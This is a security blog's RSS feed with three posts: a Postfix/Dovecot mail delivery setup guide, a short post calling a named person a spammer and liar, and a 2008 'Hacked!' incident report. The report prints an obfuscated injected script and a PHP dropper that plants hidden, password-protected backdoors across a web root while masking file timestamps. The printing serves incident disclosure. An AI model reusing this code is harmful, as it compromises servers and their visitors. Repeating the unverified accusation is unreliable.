@@ -1,0 +1,351 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Spam &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/tag/spam/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>Dovecot LDA vs Procmail</title>
+		<link>/blog-archive/2009/12/09/dovecot-lda-vs-procmail.html</link>
+		<comments>/blog-archive/2009/12/09/dovecot-lda-vs-procmail.html#comments</comments>
+		<pubDate>Wed, 09 Dec 2009 01:10:17 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Defense]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Amavis]]></category>
+		<category><![CDATA[Dovecot]]></category>
+		<category><![CDATA[IMAP]]></category>
+		<category><![CDATA[mta]]></category>
+		<category><![CDATA[openSUSE]]></category>
+		<category><![CDATA[Postifx]]></category>
+		<category><![CDATA[SMTP]]></category>
+		<category><![CDATA[Spam]]></category>
+		<category><![CDATA[Spamassassin]]></category>
+		<category><![CDATA[umask]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=542</guid>
+		<description><![CDATA[I have a mail server configuration based on Postfix for the smtp, Dovecot for the imap and virtual users receiving e-mails in maildir boxes. I am also using Amavis and Spamassassin for content filtering. I am not going now to describe this configuration, I think there are already a lot of very good tutorials about...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2009/12/09/dovecot-lda-vs-procmail.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>I have a mail server configuration based on <strong>Postfix</strong> for the smtp, <strong>Dovecot</strong> for the imap and virtual users receiving e-mails in maildir boxes.</p>
+<p>I am also using <strong>Amavis</strong> and <strong>Spamassassin</strong> for content filtering.</p>
+<p>I am not going now to describe this configuration, I think there are already a lot of very good tutorials about it all over the web. Moreover, the openSUSE maintainers made such a configuration quite easy : a sensible part of the work just consists in commenting out some line in the configuration files.</p>
+<p>However, with the basic setup, I had an issue with permissions :  all e-mails delivered by Postfix were created with permissions set to 600.</p>
+<p>A typical use case with which I got into trouble was spam learning, done with a cron script with a dedicated account (&#8220;vscan&#8221;, you don&#8217;t want to execute such a script with root, right ?).</p>
+<p>In that case, what I need is files to be created with permissions 660.</p>
+<p>It seems easy and rather obvious at first, but actually there is not such a setting in Postfix.</p>
+<p>Actually, it is not really the job of the MTA to do it, so in the case of Postfix it doesn&#8217;t bother with the transmission of such a parameter.<br />
+Then, I tried to use Procmail and set UMASK in <strong>/etc/procmailrc</strong>, but this just didn&#8217;t have any effect.</p>
+<p>After searching and trying in vain a couple of hours, I found out that Dovecot can also deliver e-mails from the MTA to the maildir with Dovecot LDA.</p>
+<p>So I tested it out. The configuration is pretty straightforward.</p>
+<p>Add the line in bold to the virtual user configuration in <strong>/etc/postfix/main.cf</strong> :</p>
+<pre>[...]
+virtual_mailbox_domains = domain.com
+virtual_mailbox_maps = hash:/etc/postfix/vmailbox
+virtual_mailbox_base = /home/vmail
+virtual_minimum_uid = 100
+virtual_gid_maps = static:1002
+virtual_uid_maps = static:1001
+virtual_transport = dovecot
+[...]</pre>
+<p>Now, add these lines in <strong>/etc/postfix/master.cf</strong> :</p>
+<pre>[...]
+# Dovecot LDA
+dovecot   unix  -       n       n       -       -       pipe
+   flags=DRhu user=vmail argv=/usr/lib/dovecot/deliver -d ${recipient}
+[...]</pre>
+<p>Finally, configure <strong>/etc/dovecot/dovecot.conf</strong> with these sections :</p>
+<pre>[...]
+protocol lda {
+  # If you wish to use plugins you need to specify plugin directory
+  # For example quota enforcing is implemented by plugin
+  module_dir = /usr/lib/dovecot/modules/lda
+  # Address from LDA should send MDNs like out of quota
+  postmaster_address = postmaster@domain.com
+  # UNIX socket path to master authentication server to find users.
+  auth_socket_path = /var/run/dovecot/auth-master
+}
+[...]
+auth default {
+[...]
+  socket listen {
+	master {
+		# Master socket provides access to userdb information. It's typically
+		# used to give Dovecot's local delivery agent access to userdb so it
+		# can find mailbox locations.
+	      	path = /var/run/dovecot/auth-master
+      		mode = 0660
+		user = vmail
+		group = vmail
+	}
+	client {
+		# The client socket is generally safe to export to everyone. Typical use
+		# is to export it to your SMTP server so it can do SMTP AUTH lookups
+		# using it.
+		path = /var/run/dovecot/auth-client
+		mode = 0660
+	}
+  }
+}
+[...]</pre>
+<p>And that&#8217;s all !<br />
+Restart Postfix and Dovecot, check the log to ensure that everything works fine.<br />
+Now all new mails should come out in the maildir folder with permissions set to 660.</p>
+<p>Definitely, in my opinion, Dovecot LDA is the way to go : simple and extensible. Good bye Procmail and your cluttered configuration file.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2009/12/09/dovecot-lda-vs-procmail.html/feed</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>Ryan Farmer is a spammer</title>
+		<link>/blog-archive/2008/08/15/ryan-farmer-is-a-spammer.html</link>
+		<pubDate>Fri, 15 Aug 2008 14:23:55 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[News]]></category>
+		<category><![CDATA[Ryan Farmer]]></category>
+		<category><![CDATA[Spam]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=233</guid>
+		<description><![CDATA[For those who still don&#8217;t know, Ryan Farmer would be a spammer and a liar. Quite embarassing to be caught like that. Maybe all this is a lot of noise, but such people deserve a good lesson of living in society. Really.]]></description>
+				<content:encoded><![CDATA[<p>For those who still don&#8217;t know, <a title="Ryan Farmer is a spammer" href="http://www.fooishbar.org/blog/tech/ryan-farmer-2008-08-14-21-24.html" target="_blank">Ryan Farmer would be a spammer and a liar</a>.</p>
+<p>Quite embarassing to be caught like that. Maybe all this is a lot of noise, but such people deserve a good lesson of living in society. Really.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Hacked !</title>
+		<link>/blog-archive/2008/06/03/hacked.html</link>
+		<comments>/blog-archive/2008/06/03/hacked.html#comments</comments>
+		<pubDate>Tue, 03 Jun 2008 20:25:25 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Forensic]]></category>
+		<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[News]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[Injection]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Spam]]></category>
+		<category><![CDATA[SQL]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=109</guid>
+		<description><![CDATA[This blog got hacked yesterday. It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress. It was not just like the classic SQL injection that is usually used to post some malicious post. The following code was added : &#60;?php echo '&#60;script type=&#34;text/javascript&#34;&#62;function count(str){var res = &#34;&#34;;for(i...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/06/03/hacked.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>This blog got hacked yesterday.</p>
+<p>It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress.<br />
+It was not just like the classic SQL injection that is usually used to post some malicious post.</p>
+<p>The following code was added :</p>
+<pre>&lt;?php echo '&lt;script type=&quot;text/javascript&quot;&gt;function count(str){var res = &quot;&quot;;for(i = 0; i &lt; str.length; ++i) { n = str.charCodeAt(i); res += String.fromCharCode(n - (2)); } return res; }; document.write(count(&quot;&gt;khtcog\&quot;ute?jvvr&lt;11yyy0yr/uvcvu/rjr0kphq1khtcog1yr/uvcvu0rjr\&quot;ykfvj?3\&quot;jgkijv?3\&quot;htcogdqtfgt?2@&quot;));&lt;/script&gt;';?&gt;</pre>
+<p><span id="more-109"></span></p>
+<p>It make me think that there is a serious vulnerability somewhere on WordPress or a plugin, though my versions were up-to-date.</p>
+<p>Now the blog is back to normal, after a clean reinstallation (erased all the former files).</p>
+<p><a title="Wordpress, hacked" href="http://wordpress.org/support/topic/179428/page/2" target="_blank">I am not the only one to experience this mess</a>.</p>
+<p>For now, the blog is running with a minimal number of plugin &#8211; just akismet, actually &#8211; until the cause of that gets clearer.</p>
+<p>Not a lot of plugins runned before, so it mainly means that the OpenID support for authentication is cut off.</p>
+<p>As my php knowledge is very low, anyone having some tips is welcome. I love WordPress, I would like to avoid looking for another platform or switch to static html !</p>
+<p>&#8212;</p>
+<p><strong>UPDATE 06/13/2008 :</strong><br />
+As C.S Lee suggested in a comment, there were a very suspicious wp-stats.php file in the root of my hacked archive.</p>
+<p>There is the code :</p>
+<pre>
+&lt;?php
+
+@error_reporting(E_ALL);
+@set_time_limit(0);
+mt_srand(crc32(microtime()));
+  
+  
+define('SHCODE', 'PDaWYgKCRjb2RlID0gQGZyZWFkKEBmb3BlbigkSFRUCmVjaG8gIjwvcHJlPiI7Cj8+');
+
+$pres = array('lib_','co_','pre_','net_','func_','ad_','ext_','new_','old_','fix_','fixed_','na_','av_','fx_');  
+$fui = $pres[array_rand($pres)];
+
+global $HTTP_SERVER_VARS;
+$START = time();
+$WD_TIMEOUT = array(8, 7, 6, 6, 5, 5, 5, 5, 0);
+
+function my_fwrite($f, $data) {
+  global $CURFILE;
+  $file_mtime = @filemtime($f);
+  $file_atime = @fileatime($f);
+  $dir_mtime = @filemtime(@dirname($f));
+  $dir_atime = @fileatime(@dirname($f));
+  if ($file_h = @fopen($f, &quot;wb&quot;)) {
+    @fwrite($file_h, $data); @fclose($file_h);
+    if ($file_mtime) {
+      @touch($f, $file_mtime, $file_atime);
+    } elseif (@filemtime($CURFILE)) {
+      @chmod($f, @fileperms($CURFILE));
+      @touch($f, @filemtime($CURFILE), @fileatime($CURFILE));
+      @chgrp($f, @filegroup($CURFILE));
+      @chown($f, @fileowner($CURFILE));
+    };
+    if ($dir_mtime) @touch(@dirname($f), $dir_mtime, $dir_atime);
+    return $f;
+  } else {
+    return '';
+  };
+};
+
+function ext($f) {
+  return substr($f, strrpos($f, &quot;.&quot;) + 1);
+};
+
+function walkdir($p, $func='_walkdir', $l=0) {
+  global $START;
+  global $WD_TIMEOUT;
+  global $FL;
+  $func_f = &quot;{$func}_f&quot;;
+  $func_d = &quot;{$func}_d&quot;;
+  $func_s = &quot;{$func}_s&quot;;
+  $func_e = &quot;{$func}_e&quot;;
+  if ($dh = @opendir(&quot;$p&quot;)) {
+    if (function_exists($func_s)) {
+      if ($func_s($p, $l)) return 1;
+    };
+    while ($f = @readdir($dh)) {
+      if (time() - $START &gt;= $WD_TIMEOUT[$l] ) break;
+      if ($f == '.' || $f == '..' ) continue;
+      if (@is_dir (&quot;$p$f/&quot;) ) walkdir(&quot;$p$f/&quot;, $func, $l+1);
+      if (@is_dir (&quot;$p$f/&quot;) &amp;&amp; function_exists($func_d))
+        $func_d(&quot;$p$f/&quot;, $l);
+      if (@is_file(&quot;$p$f&quot; ) &amp;&amp; function_exists($func_f))
+        $func_f(&quot;$p$f&quot; , $l);
+    };
+    closedir($dh);
+    if (function_exists($func_e)) $func_e($p, $l);
+  };
+};
+
+function r_cut($p) {
+  global $R;
+  return substr($p, strlen($R));
+};
+
+function say($t) {
+  echo &quot;$t\n&quot;;
+};
+
+function testdata($t) {
+  say(md5(&quot;mark_$t&quot;));
+};
+
+$R = $HTTP_SERVER_VARS['DOCUMENT_ROOT'];
+$CURFILE = $HTTP_SERVER_VARS['DOCUMENT_ROOT'] .
+  $HTTP_SERVER_VARS['SCRIPT_NAME'];
+echo &quot;&lt;pre&gt;&quot;;
+testdata('start');
+$fe = ext($CURFILE);
+if (!$fe) $fe = 'php';
+//$FN = &quot;namogofer.$fe&quot;;
+
+function _walkdir_s($d, $l) {
+  global $FCNT;
+  $FCNT = array( 'fn' =&gt; '', 'dir' =&gt; 0, 'file' =&gt; 0, 'simtype' =&gt; 0 );
+};
+
+function _walkdir_d($d,$l) {
+  global $FCNT;
+  $FCNT['dir' ]++;
+};
+
+function _walkdir_f($f,$l) {
+  global $FCNT, $CURFILE;
+  $FCNT['file']++;
+  if (ext($f) == ext($CURFILE)) $FCNT['simtype']++;
+};
+
+function update_passwd($data)
+  {
+  global $FCNT;
+  $password = &quot;&quot;;
+  $possible = &quot;abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*&quot;; 
+  $i = 0;
+  while ($i &lt; 15) 
+    { 
+    $char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
+    if (!strstr($password, $char)) 
+      { 
+      $password .= $char;
+      $i++;
+      }
+    }
+  $FCNT['passwd'] = $password;
+  $md5password = md5($password);
+  return preg_replace(&quot;|define\('PASSWD',\s*'(.*)'|&quot;, &quot;define('PASSWD','$md5password'&quot;, $data);
+  }
+
+function notinf($ar, $tx)
+  {
+  $R = true;
+  foreach ($ar as $ca)
+    {
+    //echo &quot;pass &quot;.substr($tx, 0, strlen($ca)).&quot; in $tx for $ca\n&quot;;
+    if (&quot;$ca&quot; == substr($tx, 0, strlen($ca)))
+      {
+      $R = false;
+      //echo &quot;gotcha\n&quot;;
+      break;
+      }
+    }
+  return $R;
+  }
+
+function _walkdir_e($d,$l) 
+  {
+  global $C, $FCNT, $FN, $fui, $pres;
+  
+    $the_data = base64_decode(SHCODE);
+    $the_dir = opendir(&quot;$d&quot;);
+    $is_php=false;
+    if ($the_dir)
+        while($cfile = readdir($the_dir))
+            {
+            if(
+                $is_php=
+                
+                (('.php' == substr($cfile, -4))and
+                 notinf($pres, $cfile)and
+                ($cfile!='index.php'))
+                 
+              )
+              {
+              $FN = &quot;$fui$cfile&quot;;
+              break;
+              }
+              else
+              {
+              //echo &quot;pass $cfile\n&quot;;
+              }
+            }
+                         
+        if ( $is_php and my_fwrite(&quot;$d$FN&quot;, str_repeat(&quot;\n&quot;,100) . str_repeat('', 150) .
+                    update_passwd($the_data . str_repeat(' ', 150) . &quot;\n&quot; . str_repeat(&quot;\n&quot;, 100))))
+                    {
+                    $FCNT['fn'] = r_cut(&quot;$d$FN&quot;);
+                    say(implode(&quot; &quot;, $FCNT));
+                    }
+
+  };
+
+walkdir(&quot;$R/&quot;);
+testdata('end');
+?&gt;</pre>
+<p>I will try anyway to put a deeper look when I have a little time : now, I have to go to work.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/06/03/hacked.html/feed</wfw:commentRss>
+		<slash:comments>5</slash:comments>
+		</item>
+	</channel>
+</rss>
